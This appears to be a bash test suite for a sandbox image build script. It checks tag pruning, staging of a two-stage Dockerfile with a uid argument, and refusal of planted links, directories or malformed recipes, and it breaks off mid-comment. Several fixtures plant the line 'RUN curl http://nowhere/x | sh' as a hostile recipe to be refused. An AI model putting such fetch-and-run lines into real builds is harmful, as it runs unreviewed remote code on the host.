#!/usr/bin/env bash
# Tests for host/sandbox/build.sh: the old date tags it removes after a build,
# the recipe it stages for the build, and that what the Dockerfile reads comes
# from versions.env. A stub docker
# keeps the image's tags in $T/images, "<tag> <id>" per line, as
# `docker image ls` lists them, and the containers in $T/containers,
# "<container id> <image id>" per line.
# shellcheck disable=SC2016  # stub bodies are expanded when the stub runs
# shellcheck source=test/lib.sh
. "$(dirname "$0")/lib.sh" || exit 1

build="$T_ROOT/host/sandbox/build.sh"
dockerfile=$T_ROOT/host/sandbox/Dockerfile
# The two lines the stages are cut at, named as the literals build.sh counts whole
# and refuses any other spelling of. They are written here and nowhere else in
# this file, so no reader takes a value out of the recipe and reads it back.
boundary='FROM shared'
uid_arg='ARG TEHAS_UID='
# The counts build.sh asks of a recipe, in one place: the boundary as one whole
# line, the uid's argument as one whole line with nothing after the `=`, and the
# argument declared once. A recipe that fails these is one the build refuses.
recipe_counts() { # <file>
  printf '%s %s %s\n' \
    "$(grep -cxF -- "$boundary" "$1")" \
    "$(grep -cxF -- "$uid_arg" "$1")" \
    "$(grep -c '^ARG TEHAS_UID' "$1")"
}
# image_steps <file>: the steps of one recipe, as the build runs them, and the
# number of the boundary among them. One entry per instruction, the continuations
# joined into the instruction, and the comments, which run no step, left out - a
# comment that opens a continuation line is dropped before the joining, as docker
# drops it. The number of the boundary comes back under the name `boundary`, or
# `none` when the recipe holds no step that reads exactly that, so a consumer that
# compares step numbers has to refuse it rather than compare against zero. A
# comment that stands inside a continuation is said under the name `comment`, so
# the one read of the file names it too.
image_steps() { # <file>
  awk '{ line = $0
  while (line ~ /^[ \t]*#/) { if ((getline line) <= 0) next }
  start = line
  while (sub(/[ \t]*\\[ \t]*$/, "", line)) {
    if ((getline nxt) <= 0) break
    if (nxt ~ /^[ \t]*#/ || nxt ~ /^#/) { print "comment\t" start; continue }
    line = line " " nxt
  }
  if (line !~ /^[ \t]*(FROM|RUN|COPY|ADD)([ \t]|$)/) next
  sub(/^[ \t]*/, "", line)
  if (line == "FROM shared") boundary = n + 1
  step[++n] = line
}
END {
  for (i = 1; i <= n; i++) print i "\t" step[i]
  print "boundary\t" (boundary ? boundary : "none")
}' "$1"
}
# The copy the build handed docker is the file the stub kept out of the docker
# call, and that file is the only reading of it these cases use: nothing here
# stages a recipe of its own, since a staging written beside the build's is a
# second reader that drifts with the build rather than against it. Each case that
# asks something of it runs a build first and reads $T/docker-build-recipe, which
# setup clears, so the copy is always the one the case's own run handed over.
# install_host_toolchain: the toolchain as a host holds it, which is where the
# build reads the recipe beside itself: the script, the tracked recipe, the lib it
# sources, and the pins it reads. A variant of the script is copied by a case that
# wants to hand it a recipe of its own.
install_host_toolchain() {
  home=$T/home/tehas/sandbox
  mkdir -p "$home" "$T/home/tehas/lib"
  cp "$build" "$dockerfile" "$home/"
  cp "$T_ROOT"/lib/headless.sh "$T_ROOT"/lib/rukas.sh "$T_ROOT"/lib/config.sh \
    "$T_ROOT"/lib/sandbox.sh "$T_ROOT"/lib/models.sh "$T/home/tehas/lib/"
  cp "$T_ROOT/host/versions.env" "$T/home/tehas/"
}
# The build runs from the checkout here, which has no console beside it.
# shellcheck disable=SC2154  # t_console_why is set by t_console (test/lib.sh)
t_console || t_bad "no console: $t_console_why"
T_ENV_ALWAYS+=("TEHAS_CONSOLE=$T_CONSOLE")
uid=$(id -u)
# pi-rukas's newest release tag, so the build asks no network.
t_stub git 'printf "%s\trefs/tags/v0.12.80\n" aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
t_stub docker 'case "$1" in
  build)
    # The recipe the build was handed, kept while the run stands: build.sh takes
    # its own copy back when it ends, so this is the only reading of it. The -f
    # name and its value come in pairs, and the pair is what is asked. The mode of
    # the file at that moment goes with it, in case the build served that name
    # from somewhere else: a name someone else made is not a name to write into.
    prev=""
    for a in "$@"; do
      if [ "$prev" = -f ] && [ -f "$a" ]; then
        cp "$a" "$T/docker-build-recipe"
        stat --format=%a "$a" >"$T/docker-build-mode" 2>/dev/null || echo none >"$T/docker-build-mode"
      fi
      prev=$a
    done
    while [ "$#" -gt 0 ]; do [ "$1" = -t ] && echo "${2#*:} sha256:new" >>"$T/images"; shift; done ;;
  tag) echo "${3#*:} sha256:new" >>"$T/images" ;;
  ps) [ -z "${PS_RC:-}" ] || exit "$PS_RC"; cut -d" " -f1 "$T/containers" ;;
  inspect) shift 3; for c in "$@"; do awk -v c="$c" "\$1 == c { print \$2 }" "$T/containers"; done ;;
  image)
    if [ "$2" = inspect ] && [ -n "${LABEL:-}" ]; then echo "$LABEL"; else awk "!seen[\$1]++" "$T/images"; fi ;;
  rmi) [ "$2" != "${RMI_FAILS:-}" ] || exit 1 ;;
  run) if [ -n "${CAPS:-}" ]; then echo "$CAPS"; else cat "$T_ROOT/test/fixtures/headless-c5ddc0a/capabilities.json"; fi ;;
esac'
# Six builds before this one, the oldest first, each its own image. The last
# also carried the uid tag, which the build moves to the new image.
setup() {
  : >"$T/containers"
  printf '%s\n' "uid$uid sha256:new" "uid$uid sha256:6" "261009-1000 sha256:1" "261010-1000 sha256:2" \
    "261011-1000 sha256:3" "261012-1000 sha256:4" "261013-1000 sha256:5" "261014-1000 sha256:6" >"$T/images"
  rm -f "$T"/calls/* "$T/docker-build-recipe" "$T"/home/tehas/sandbox/sandbox-uid.Dockerfile*
}
removed() { t_calls docker | awk '$1 == "rmi" { print $2 }' | LC_ALL=C sort | tr '\n' ' '; }

t_case "after a build the newest three date tags stay and older ones are removed"
setup
t_run "$build"
t_eq "$t_rc" 0
t_eq "$(removed)" "tehas/pi-rukas:261009-1000 tehas/pi-rukas:261010-1000 tehas/pi-rukas:261011-1000 tehas/pi-rukas:261012-1000 "
t_contains "$t_out" "removed tehas/pi-rukas:261009-1000"
t_lacks "$(t_calls docker)" "rmi tehas/pi-rukas:uid"

t_case "a tag whose image a container was made from is kept"
setup
printf '%s\n' "c1 sha256:2" "c2 sha256:new" >"$T/containers"
t_run "$build"
t_eq "$t_rc" 0
t_eq "$(removed)" "tehas/pi-rukas:261009-1000 tehas/pi-rukas:261011-1000 tehas/pi-rukas:261012-1000 "
t_contains "$t_out" "kept tehas/pi-rukas:261010-1000: a container or a uid tag uses it"

t_case "a tag whose image another uid tag names is kept"
setup
echo "uid4242 sha256:1" >>"$T/images"
t_run "$build"
t_eq "$t_rc" 0
t_eq "$(removed)" "tehas/pi-rukas:261010-1000 tehas/pi-rukas:261011-1000 tehas/pi-rukas:261012-1000 "

t_case "a tag that cannot be removed is said, and the build still counts"
setup
T_ENV=(RMI_FAILS=tehas/pi-rukas:261010-1000)
t_run "$build"
t_eq "$t_rc" 0
t_contains "$t_out" "warning: could not remove tehas/pi-rukas:261010-1000"
t_contains "$t_out" "removed tehas/pi-rukas:261009-1000"
T_ENV=()

t_case "a docker that does not list its containers removes nothing"
setup
T_ENV=(PS_RC=1)
t_run "$build"
t_eq "$t_rc" 0
t_eq "$(removed)" ""
t_contains "$t_out" "no old tehas/pi-rukas tag was removed"
T_ENV=()

t_case "three builds or fewer remove nothing"
setup
printf '%s\n' "uid$uid sha256:2" "261010-1000 sha256:1" "261011-1000 sha256:2" >"$T/images"
t_run "$build"
t_eq "$t_rc" 0
t_eq "$(removed)" ""

# Only one file of the image is tracked. The copy the build is made of is written
# from it just before docker is asked and taken back when the run ends, so the two
# cannot drift, nothing stands between builds, and a build handed the tracked file
# alone - which would stop at the boundary with no user remapped and no tool gate
# - is caught by what it names in its own call. The uid it passes comes from the
# machine and from no file of the repository.
t_case "the build stages the image from the Dockerfile and builds that"
setup
# The toolchain as a host holds it, which is where the build reads the recipe
# beside itself: the file, the lib it sources, and the pins it reads.
install_host_toolchain
t_run "\"$home/build.sh\" >/dev/null || exit 1
! test -e \"$home/sandbox-uid.Dockerfile\" || echo left behind
! ls \"$home\"/sandbox-uid.Dockerfile.?????? 2>/dev/null || echo staged file left behind"
t_eq "$t_rc" 0
t_eq "$t_out" ""
# The file the run made is asked of the stub while the build is still standing,
# so a copy an earlier run left behind cannot answer for it: the copy is made,
# used and taken away by the same run, and what docker was handed is the whole
# image - both stages, with every step the tracked recipe holds. The boundary and
# the uid argument are counted of that file by the same counts build.sh makes, and
# the stages are compared against the tracked file by name, not against a copy
# this file staged itself.
t_eq "$(recipe_counts "$T/docker-build-recipe")" "1 1 1"
t_eq "$(recipe_counts "$dockerfile")" "1 1 1"
# The copy is made under a name of its own and renamed onto the one docker is
# given, so the build never has that name open: whatever stood under it is gone by
# the time docker reads it, and the file it reads is the one this run wrote, which
# is owner-only because no one else is meant to read the image's steps out of it.
# The mode and the contents are asked of the stub while the build stands, so a copy
# an earlier run left behind answers for neither.
t_eq "$(cat "$T/docker-build-mode")" 600
build_call=$(t_calls docker | grep -m 1 '^build ')
# The -f of the build docker was asked for names the staged recipe, and that is
# the file whose contents, mode, boundary and uid argument are asked above: a
# build that dropped -f altogether would leave the stub with no recipe to keep,
# and those reads would fail rather than compare empty to empty.
t_eq "$(sed -n 's/.* -f \([^ ]*\) .*/\1/p' <<<"$build_call")" "$home/sandbox-uid.Dockerfile"
# One file names both stages, so a build that was given only the tracked one -
# whose second stage has no base of its own to take - is a build that says so
# here, and no argument is passed that the staged file does not declare.
t_eq "$(grep -c -- '-f ' <<<"$build_call")" 1
t_contains "$build_call" "-f $home/sandbox-uid.Dockerfile"
t_lacks "$build_call" "-f $home/Dockerfile"
t_contains "$build_call" "--build-arg TEHAS_UID=$uid"
# The stage below the boundary is the one the tracked file ends at: its FROM, the
# remap, and the read of the model that has to see the id the remap gave. The
# boundary of the copy docker was handed is read as the whole line build.sh cuts
# at, so the second stage named here is the stage docker reads.
stage=$(sed -n "/^${boundary}\$/,\$p" "$T/docker-build-recipe")
t_contains "$stage" 'ARG TEHAS_UID='
t_contains "$stage" 'usermod -u "$TEHAS_UID"'

t_case "the staged image holds every step the tracked file has and no argument twice"
setup
install_host_toolchain
# The build makes its own copy; this case asks everything of the file the stub
# kept out of the docker call, so a staging that lost a step, added one or cut the
# boundary elsewhere fails here rather than beside a copy this file staged too.
t_run "\"$home/build.sh\" >/dev/null"
t_eq "$t_rc" 0
# Every RUN, COPY and ADD of the tracked file is in the copy docker was handed,
# and that copy holds no step the file does not: a staging that lost a step would
# build an image with something missing from it, and one that added a step would
# build one with something no one reviews. Both sides are read by one parser, the
# one the last case uses for its steps, so the two lists are counted the same way.
tracked=$(image_steps "$dockerfile" | cut -f2- | grep -E '^(RUN|COPY|ADD)' | LC_ALL=C sort)
staged=$(image_steps "$T/docker-build-recipe" | cut -f2- | grep -E '^(RUN|COPY|ADD)' | LC_ALL=C sort)
t_eq "$staged" "$tracked"
# The steps above the boundary are the same steps, in the same order, on both
# sides of the cut: the shared half of the image is the tracked file's own half,
# and not something the staging invented.
tracked_shared=$(image_steps "$dockerfile" | awk -F '\t' '$1 == "comment" { next } $1 == "boundary" { exit } { print $2 }')
staged_shared=$(image_steps "$T/docker-build-recipe" | awk -F '\t' '$1 == "comment" { next } $1 == "boundary" { exit } { print $2 }')
t_eq "$staged_shared" "$tracked_shared"
# One ARG line for the uid, and it stands below the boundary of the file docker
# was handed: an argument is read from the line that declares it, so a second one
# above would let the remap see the empty value of the stage that holds it. Both
# are asked of the copy the build made, since that is the recipe docker reads.
t_eq "$(grep -cxF -- "$uid_arg" "$T/docker-build-recipe")" 1
t_contains "$(sed -n "/^${boundary}\$/,\$p" "$T/docker-build-recipe")" 'ARG TEHAS_UID='
# Nothing stands above the boundary of the copy that carries the argument: the
# half every instance user shares holds no uid for its own stage to read.
t_eq "$(sed -n "1,/^${boundary}\$/p" "$T/docker-build-recipe" | grep -c '^ARG TEHAS_UID')" 0

t_case "a recipe whose two-stage boundary the build cannot read is refused and asks nothing"
setup
# The boundary and the uid argument are read out of the tracked file, so a recipe
# that no longer holds them as whole lines is a recipe the build cannot cut, and
# cutting it wrongly would hand docker one stage with no user remapped. The build
# says which file is wrong, asks docker nothing, and leaves the tracked recipe
# where it was.
install_host_toolchain
sed -i 's|^FROM shared$|  FROM shared|' "$home/Dockerfile"
t_run "\"$home/build.sh\""
t_eq "$t_rc" 1
t_contains "$t_out" "$home/Dockerfile does not hold one 'FROM shared' stage and one 'ARG TEHAS_UID=' line"
t_eq "$(t_calls docker)" ""
# The refusal is about the copy the case broke, not the file of the checkout, and
# the copy on disk keeps the words the case wrote: a refused build rewrites nothing
# of the recipe.
t_run "cmp -s \"$dockerfile\" \"$T_ROOT/host/sandbox/Dockerfile\""
t_eq "$t_rc" 0
t_run "test -s \"$home/sandbox-uid.Dockerfile\""
t_eq "$t_rc" 1

# The five branches between the recipe and docker are each a way a copy of it
# could stand after a refused run, so each is driven and each is asked for the
# same two things: the reason it says, and nothing left at either name.
t_case "a uid that is not a number is refused with 78 and leaves nothing"
setup
install_host_toolchain
# The path of this run is a copy of the stub directory with its own id in front
# of the real one, so the build asks an account of the case's choosing and nothing
# else about the run changes.
noid=$T/bin/not-a-number
mkdir -p "$noid"
printf '#!%s\nprintf "%%s\\n" "$UID_NOT_A_NUMBER"\n' "$T_BASH" >"$noid/id"
chmod +x "$noid/id"
T_ENV=(UID_NOT_A_NUMBER=10o1 "PATH=$noid:$T/bin:$PATH")
t_run "\"$home/build.sh\""
T_ENV=()
t_eq "$t_rc" 78
t_contains "$t_out" "the uid of this account is '10o1', not a number"
t_eq "$(t_calls docker)" ""
t_run "for f in \"$home\"/sandbox-uid.Dockerfile*; do [ -e \"\$f\" ] || [ -L \"\$f\" ] || continue; echo \"left \$f\"; done
true"
t_eq "$t_rc" 0
t_eq "$t_out" ""

t_case "without mktemp the build says it could not stage and asks nothing"
setup
install_host_toolchain
# The temporary is made where the recipe stands, not in TMPDIR, so the run is
# driven down its own staging path with the directory it ends at made unwritable:
# a copy of the toolchain that cannot hold a file. The run has the whole tool
# path, so everything but the staging is as a build's is, and the refusal is the
# staging's own, before docker is asked.
for_stage=$T/home/no-stage
mkdir -p "$for_stage/sandbox" "$for_stage/lib"
cp "$build" "$dockerfile" "$for_stage/sandbox/"
cp "$T_ROOT"/lib/headless.sh "$T_ROOT"/lib/rukas.sh "$T_ROOT"/lib/config.sh \
  "$T_ROOT"/lib/sandbox.sh "$T_ROOT"/lib/models.sh "$for_stage/lib/"
cp "$T_ROOT/host/versions.env" "$for_stage/"
# The name the staging would have used is made first, owned by the case, so the
# refusal is asked of a copy the run would have replaced: the run takes nothing
# out of a directory it cannot write, and leaves the copy for the next build.
printf 'kept by the case\n' >"$for_stage/sandbox/sandbox-uid.Dockerfile"
: >"$T/docker-build-recipe"
t_run "chmod 500 \"$for_stage/sandbox\"; \"$for_stage/sandbox/build.sh\"; rc=\$?; chmod 755 \"$for_stage/sandbox\"; exit \$rc"
t_eq "$t_rc" 1
t_contains "$t_out" "could not stage a recipe beside $for_stage/sandbox"
t_run "cat \"$for_stage/sandbox/sandbox-uid.Dockerfile\" 2>/dev/null || echo gone; true"
t_eq "$t_rc" 0
t_eq "$t_out" "kept by the case"

# A temporary of an earlier run the directory will not give up is refused with it:
# the sweep takes back what it can and stops rather than building beside a
# leftover it cannot call its own.
printf 'kept by the case\n' >"$for_stage/sandbox/sandbox-uid.Dockerfile.123456"
t_run "chmod 500 \"$for_stage/sandbox\"; \"$for_stage/sandbox/build.sh\"; rc=\$?; chmod 755 \"$for_stage/sandbox\"; exit \$rc"
t_eq "$t_rc" 1
t_contains "$t_out" "could not take back $for_stage/sandbox/sandbox-uid.Dockerfile.123456"
t_run "cat \"$for_stage/sandbox/sandbox-uid.Dockerfile.123456\" 2>/dev/null || echo gone; true"
t_eq "$t_rc" 0
t_eq "$t_out" "kept by the case"

t_case "a directory at the staged name is refused and left as its owner left it"
setup
install_host_toolchain
# A directory under the name stops the build on its redirect, so the name is
# refused before anything is asked of docker, and what stands there is what its
# owner left: the run takes back nothing it did not make.
mkdir "$home/sandbox-uid.Dockerfile"
t_run "\"$home/build.sh\""
t_eq "$t_rc" 1
t_contains "$t_out" "refusing to build, $home/sandbox-uid.Dockerfile is already there and is not a plain file"
t_eq "$(t_calls docker | grep -c -e '^pull' -e '^build')" 0
t_run "test -d \"$home/sandbox-uid.Dockerfile\" || echo taken away; true"
t_eq "$t_rc" 0
t_eq "$t_out" ""
rmdir "$home/sandbox-uid.Dockerfile"

t_case "a link under the name of a build's temporary is refused, not removed"
setup
install_host_toolchain
# The sweep of earlier temporaries names a file, it does not prove who wrote it,
# so a link at that name is refused with the run rather than unlinked: the file it
# points at is not the build's to take away either.
printf 'kept\n' >"$T/foreign-temp"
ln -s "$T/foreign-temp" "$home/sandbox-uid.Dockerfile.abcdef"
t_run "\"$home/build.sh\""
t_eq "$t_rc" 1
t_contains "$t_out" "sandbox-uid.Dockerfile.abcdef is named like a build's temporary and is not a plain file"
t_eq "$(t_calls docker)" ""
t_run "[ -L \"$home/sandbox-uid.Dockerfile.abcdef\" ] || echo link taken
[ -e \"$T/foreign-temp\" ] || echo target gone
true"
t_eq "$t_rc" 0
t_eq "$t_out" ""
rm -f "$home/sandbox-uid.Dockerfile.abcdef" "$T/foreign-temp"

# A default written after the uid's argument is the other way the contract breaks:
# the line still reads ARG TEHAS_UID, so a check that anchors only the prefix
# accepts it, and the stage then holds a uid of its own for the remap to fall back
# on. The build reads the whole line, refuses, and asks docker nothing.
t_case "a recipe whose uid argument holds a default is refused and asks nothing"
setup
install_host_toolchain
sed -i 's|^ARG TEHAS_UID=$|ARG TEHAS_UID=1000|' "$home/Dockerfile"
t_run "\"$home/build.sh\""
t_eq "$t_rc" 1
t_contains "$t_out" "$home/Dockerfile does not hold one 'FROM shared' stage and one 'ARG TEHAS_UID=' line"
t_eq "$(t_calls docker)" ""
t_run "test -e \"$home/sandbox-uid.Dockerfile\""
t_eq "$t_rc" 1

# A whole-line boundary the cut cannot stop at is the other way the contract
# breaks: the counts read whole lines and see one boundary, while the cut that
# takes its pattern from the file looks elsewhere, and docker is handed a recipe
# whose second stage was never opened. The build catches that in the copy it made,
# before docker is asked, and leaves neither its temporary nor the staged name.
t_case "a staged copy whose boundary the cut cannot find is refused before docker"
setup
install_host_toolchain
# The build reads the two lines of the contract out of the tracked file, so a
# boundary whose characters the cut it builds cannot read is refused by the count
# of the copy and not by the count of the file. `+` is no operator at the start of
# a regular expression and reads as itself, which is why the recipe holds it.
sed -i 's|^FROM shared$|FROM shar+ed|' "$home/Dockerfile"
t_eq "$(grep -cxF -- 'FROM shared' "$home/Dockerfile")" 0
t_run "\"$home/build.sh\""
t_eq "$t_rc" 1
t_contains "$t_out" "$home/Dockerfile does not hold one 'FROM shared' stage and one 'ARG TEHAS_UID=' line"
t_eq "$(t_calls docker)" ""
t_run "for f in \"$home\"/sandbox-uid.Dockerfile*; do [ -e \"\$f\" ] || [ -L \"\$f\" ] || continue; echo \"left \$f\"; done
true"
t_eq "$t_rc" 0
t_eq "$t_out" ""

# The build reads the recipe beside itself, as it reads the libraries beside
# itself: a toolchain that lacks it says so and asks nothing, rather than failing
# inside the staging with a sed error.
t_case "without the Dockerfile beside it nothing is asked or built"
setup
install_host_toolchain
rm -f "$home/Dockerfile"
t_run "\"$home/build.sh\""
t_eq "$t_rc" 1
t_contains "$t_out" "no Dockerfile beside $home"
t_eq "$(t_calls docker | grep -c -e '^pull' -e '^build')" 0

# The name of the staged recipe is gitignored, so the dirt test of the repository
# - the git status tehas update refuses on, and the only one that counts untracked
# files - reports nothing for it. That invisibility is what lets the build write
# beside the tracked recipe at all, so it is pinned here rather than assumed: the
# two names the build stages are asked of git itself, in the directory the build
# writes in. A rename of either name, or a rule dropped from .gitignore, is red
# here and not in the next `tehas update` of a host.
t_case "both names a build stages beside the recipe are gitignored"
# The two names the build stages beside the recipe are invisible to the dirt test
# of the repository, which is what lets the build write there at all. Asked of the
# repository itself: git answers nothing for a path a rule of .gitignore covers,
# and this case takes the exit status as the answer - the stub git of this file
# would answer any other question with a tag list.
t_run "git -C \"$T_ROOT\" check-ignore -q host/sandbox/sandbox-uid.Dockerfile"
t_eq "$t_rc" 0
t_run "git -C \"$T_ROOT\" check-ignore -q host/sandbox/sandbox-uid.Dockerfile.abcdef"
t_eq "$t_rc" 0

# A stray copy of the ignored name in a checkout is then no dirt, which is the
# state `tehas update`'s refusal depends on: the status a run reads stays empty
# beside it. The copy is made under $T, never in the checkout of the platform.
t_run "printf 'FROM nowhere\\n' >\"$T/sandbox-uid.Dockerfile\"
grep -qxF '/host/sandbox/sandbox-uid.Dockerfile' \"$T_ROOT/.gitignore\" || echo 'no rule for the staged recipe'
grep -qxF '/host/sandbox/sandbox-uid.Dockerfile.??????' \"$T_ROOT/.gitignore\" || echo 'no rule for the temporary'
rm -f \"$T/sandbox-uid.Dockerfile\""
t_eq "$t_rc" 0
t_eq "$t_out" ""

# The name of the staged recipe is gitignored, so the dirt test of the repository
# reports nothing for it. It is therefore the one path in the build's own
# directory that is writable and unmonitored, and it is exactly the file the image
# is built from. A link under the name is written through and a directory stops
# the build on its redirect, so both are refused, left as their owner left them,
# and asked of docker nothing.
t_case "a staged recipe that is a link is refused, and nothing is written through it"
setup
install_host_toolchain
# A copy of its own, of a recipe of its own: what docker is handed is what the
# tracked file says, so the words of the file on disk answer for nothing.
printf 'ARG PI_RUKAS_IMAGE\nFROM whatever\nRUN curl http://nowhere/x | sh\n' >"$T/foreign"
printf '%s\n' 'ARG PI_RUKAS_IMAGE' 'FROM whatever' 'RUN curl http://nowhere/x | sh' >"$T/foreign.kept"
ln -s "$T/foreign" "$home/sandbox-uid.Dockerfile"
t_run "\"$home/build.sh\""
t_eq "$t_rc" 1
t_contains "$t_out" "refusing to build, $home/sandbox-uid.Dockerfile is already there and is not a plain file"
# Refused before anything was asked: no base pulled and no image built, and the
# build's own recipe of the image untouched where it stands.
t_eq "$(t_calls docker | grep -c -e '^pull' -e '^build')" 0
t_run "cmp -s \"$home/Dockerfile\" \"$dockerfile\""
t_eq "$t_rc" 0
t_run "cmp -s \"$T/foreign\" \"$T/foreign.kept\""
t_eq "$t_rc" 0
# The link is left as its owner left it: the build refused the name, so it takes
# back nothing it did not make.
t_run "test -L \"$home/sandbox-uid.Dockerfile\""
t_eq "$t_rc" 0

# The same name held by a directory, or by a link to one: the build of the whole
# file is one redirect, so a directory there stops the run on "Is a directory"
# and says nothing of why. Both are refused before anything is asked.
t_case "a staged recipe that is a directory, or a link to one, is refused before the build"
setup
install_host_toolchain
for shape in dir link-to-dir; do
  rm -rf "$home/sandbox-uid.Dockerfile"
  case $shape in
    dir) mkdir "$home/sandbox-uid.Dockerfile" ;;
    link-to-dir)
      mkdir "$T/notafile"
      ln -s "$T/notafile" "$home/sandbox-uid.Dockerfile"
      ;;
  esac
  t_run "\"$home/build.sh\""
  t_eq "$t_rc" 1
  t_contains "$t_out" "refusing to build, $home/sandbox-uid.Dockerfile is already there and is not a plain file"
  t_eq "$(t_calls docker | grep -c -e '^pull' -e '^build')" 0
  # What stands there is what its owner left: a refusal writes nothing, and takes
  # back nothing it did not make.
  t_run "test -e \"$home/sandbox-uid.Dockerfile\""
  t_eq "$t_rc" 0
done
rm -rf "$home/sandbox-uid.Dockerfile" "$T/notafile"

# The copy of a run killed by a signal bash cannot catch, which is the shape that
# leaves a recipe standing: the build names the time it was written, says it
# replaces that copy, and asks docker nothing about it. The tracked recipe it
# builds from is untouched, and the copy on disk is the whole image when the run
# ends, not the words someone left under the name.
t_case "a stale staged recipe is replaced, said with the time it was written"
setup
install_host_toolchain
printf 'ARG PI_RUKAS_IMAGE\nFROM whatever\nRUN curl http://nowhere/x | sh\n' >"$home/sandbox-uid.Dockerfile"
t_run "\"$home/build.sh\" >/dev/null || exit 1
! test -e \"$home/sandbox-uid.Dockerfile\" || echo left behind"
t_eq "$t_rc" 0
t_contains "$t_out" "is the copy an earlier build left, written"
t_eq "$(t_calls docker | grep -c -e '^pull' -e '^build')" 2
t_run "cmp -s \"$home/Dockerfile\" \"$dockerfile\""
t_eq "$t_rc" 0
# The copy docker was handed is the whole image the tracked file describes, not
# the words of the stale one: the boundary and the argument are counted by the
# same counts build.sh makes, of the file the stub kept.
t_eq "$(recipe_counts "$T/docker-build-recipe")" "1 1 1"
# The temporary of a run that never reached its trap has the build's own name and
# no owner: the next run takes it back, and no copy of the recipe is left standing
# between builds.
printf 'ARG PI_RUKAS_IMAGE\nFROM whatever\nRUN curl http://nowhere/x | sh\n' >"$home/sandbox-uid.Dockerfile.123456"
t_run "\"$home/build.sh\" >/dev/null || exit 1
[ -e \"$home\"/sandbox-uid.Dockerfile.123456 ] && echo temp left
test -e \"$home\"/sandbox-uid.Dockerfile && echo recipe left; true"
t_eq "$t_rc" 0
t_eq "$t_out" ""

# The build is handed one file: the copy it made. The tracked recipe, which is a
# different file by then, is never what docker is given, and the argument that
# decides the remap comes from the machine and from no file of the repository.
t_case "the build hands docker the copy it made and never the tracked recipe"
setup
install_host_toolchain
t_run "\"$home/build.sh\" >/dev/null || exit 1"
t_eq "$t_rc" 0
build_call=$(t_calls docker | grep -m 1 '^build ')
t_eq "$(sed -n 's/.* -f \([^ ]*\) .*/\1/p' <<<"$build_call")" "$home/sandbox-uid.Dockerfile"
t_contains "$build_call" "--build-arg TEHAS_UID=$uid"
t_eq "$(cat "$T/docker-build-mode")" 600

t_case "every argument the image reads is passed from versions.env"
# The copy the last case built is the recipe whose ARG lines are read here, so
# the run is made first and its kept recipe is the single source of the names.
setup
install_host_toolchain
t_run "\"$home/build.sh\" >/dev/null"
t_eq "$t_rc" 0
# The build of this case, so the copy docker was handed is the one read below.
install_host_toolchain
t_run "\"$home/build.sh\" >/dev/null"
t_eq "$t_rc" 0
while read -r arg; do
  case $arg in PI_RUKAS_IMAGE | PI_RUKAS_COMMIT | TEHAS_UID | TEHAS_RUKAS_IMAGES) continue ;; esac
  grep -q "^$arg=" "$T_ROOT/host/versions.env" || t_bad "$arg is not in versions.env"
  grep -qF -- "--build-arg $arg=\"\$$arg\"" "$build" || t_bad "build.sh does not pass $arg"
done < <(sed -n 's/^ARG \([A-Z0-9_]*\).*/\1/p' "$dockerfile")
# One --build-arg for each ARG line the copy docker was handed declares, and no
# build-arg for a name that copy does not declare. Both sides are read the same
# way - one entry per declaration, then sorted, then compared whole and compared
# by count - so a name written twice on either side is named rather than folded
# away by a de-duplicating sort. The ARG lines are asked of the file the stub kept
# out of the docker call, since that is the recipe docker reads.
build_args=$(grep -oE -- '--build-arg [A-Za-z_][A-Za-z0-9_]*=' "$build" |
  sed 's/^--build-arg //; s/=$//' | LC_ALL=C sort)
recipe_args=$(sed -n 's/^ARG \([A-Za-z_][A-Za-z0-9_]*\)\([ =]\|$\).*/\1/p' "$T/docker-build-recipe" |
  LC_ALL=C sort)
bad_build=$(grep -E -- '--build-arg [^A-Za-z0-9_= ]' "$build" || true)
[ -z "$bad_build" ] || t_bad "build.sh passes a --build-arg of a shape the parity below cannot read: $bad_build"
bad_recipe=$(grep -nE '^ARG [^A-Za-z0-9_ ]' "$T/docker-build-recipe" || true)
[ -z "$bad_recipe" ] || t_bad "the staged recipe declares an ARG of a shape the parity below cannot read: $bad_recipe"
t_eq "$recipe_args" "$build_args"
# Both directions, as the header of the image claims: one --build-arg for each ARG
# line, and no argument that declares nothing. The lists are kept whole, so a name
# on one side and not the other is named, in whichever direction, and the counts
# are compared as well as the names: a name that stands twice on one side and once
# on the other has no name to report, and only the count says so.
missing=$(LC_ALL=C comm -23 <(printf '%s\n' "$recipe_args") <(printf '%s\n' "$build_args"))
extra=$(LC_ALL=C comm -13 <(printf '%s\n' "$recipe_args") <(printf '%s\n' "$build_args"))
[ -z "$missing" ] || t_bad "the staged recipe declares an argument no --build-arg answers for: $missing"
[ -z "$extra" ] || t_bad "build.sh passes an argument the staged recipe does not declare: $extra"
t_eq "$(printf '%s\n' "$recipe_args" | wc -l)" "$(printf '%s\n' "$build_args" | wc -l)"
t_eq "$(grep -c '^ARG TEHAS_UID' "$T/docker-build-recipe")" 1

# The image is shared between the instance users of a host by its layers: a
# layer built for one uid is a layer every other uid's build reuses, and one
# that reads the uid is rebuilt and stored again for each of them. So the uid
# enters as late as the file allows - later still than one file can, since the
# checks that run as the cycle's user and the answer for the base have to be
# read once the id has moved. host/sandbox/Dockerfile holds the layers the uid
# does not decide and ends at the stage that takes them; the recipe build.sh
# writes from it is the rest. The steps of the recipe are read as the build sees
# them: the continuations joined into the instruction the build runs, and the
# comments, which run no step, left out. What is asked is that the remap is the
# only step of the whole image that reads the uid, and that no step of the layers
# named below reads it. The read is not vacuous: each step named below is asked
# for by its own words, so a Dockerfile that no longer holds one of them fails
# here rather than passing for the want of a match, and a file that lost the
# boundary loses the stage below it and fails with it. The layers named first are
# the ones the issue names: the packages, the code indexer, the downloads and the
# embedding model, and the read of that model; the last is the browsers, the most
# expensive step of the build.
t_case "the sandbox image reads the uid only in its last steps"
setup
install_host_toolchain
t_run "\"$home/build.sh\" >/dev/null"
t_eq "$t_rc" 0
# One parser reads the recipe for this case: the steps of the image as the build
# runs them, and the number of the boundary among them. A step before that number
# is a layer the instance users of one host share; a step from it on belongs to one
# uid, so nothing that reads the id, or holds it in its words, may stand above it.
# The read is not vacuous: each step named below is asked for by its own words, so
# a Dockerfile that no longer holds one of them fails here rather than passing for
# the want of a match.

steps=$(image_steps "$dockerfile")
# The parser names a comment it dropped or refused to fold, so the one read of
# the file says both what the steps are and whether a comment stands where a
# continuation should.
comment_in_step=$(awk -F '\t' '$1 == "comment" { print $2 }' <<<"$steps")
[ -z "$comment_in_step" ] ||
  t_bad "a step of the image continues with a comment line, which no reader of the recipe reads as the build does: $comment_in_step"
# step_of <words>: the number of the first step whose words hold these, 0 for none.
# A word that stands only in a comment names no step, since the comments are not
# among the lines below.
